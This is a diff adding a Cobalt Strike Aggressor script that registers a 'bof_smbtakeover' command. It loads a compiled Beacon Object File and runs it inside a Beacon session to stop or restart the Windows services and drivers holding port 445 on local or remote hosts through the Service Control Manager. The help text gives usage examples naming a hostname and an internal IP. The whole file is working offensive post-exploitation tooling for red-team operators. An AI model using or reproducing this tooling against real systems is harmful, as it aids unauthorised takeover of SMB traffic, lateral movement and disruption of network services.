@@ -1,0 +1,25 @@
+beacon_command_register(
+"bof_smbtakeover", 
+"BOF for binding and unbinding 445/tcp via SCM manipulation", 
+"\n~smbtakeover BOF by @zyn3rgy~\n\nThis BOF interacts with the Service Control Manager (SCM) to manipulate the services\nand drivers associated with 445/tcp being bound on Windows by default. When connecting\nto remote hosts, RCP over TCP is used as a transport by default, meaning even if you\ndisable SMB and unbind 445 remotely, you will still be able to connect back to the\nremote host because you are note using named pipes to do so.\n\nUsage:\nbof_smbtakeover <host> <check/start/stop>\n\nExamples:\nbof_smbtakeover localhost check\nbof_smbtakeover pc.tart.local stop\nbof_smbtakeover 10.0.0.32 start\n\n");
+
+alias bof_smbtakeover {
+    local('$barch $handle $data $args');
+
+    btask($1, "");
+    btask($1, "~Executing smbtakeover BOF by @zyn3rgy~");
+    btask($1, "");
+
+    # figure out the arch of this session
+    $barch  = barch($1);
+   
+    # read in the right BOF file
+    #$handle = openf(script_resource("/mnt/hgfs/Desktop/bof. $+ $barch $+ .o"));
+    $handle = openf(script_resource("bof.x64.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($1, "zz", $2, $3);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
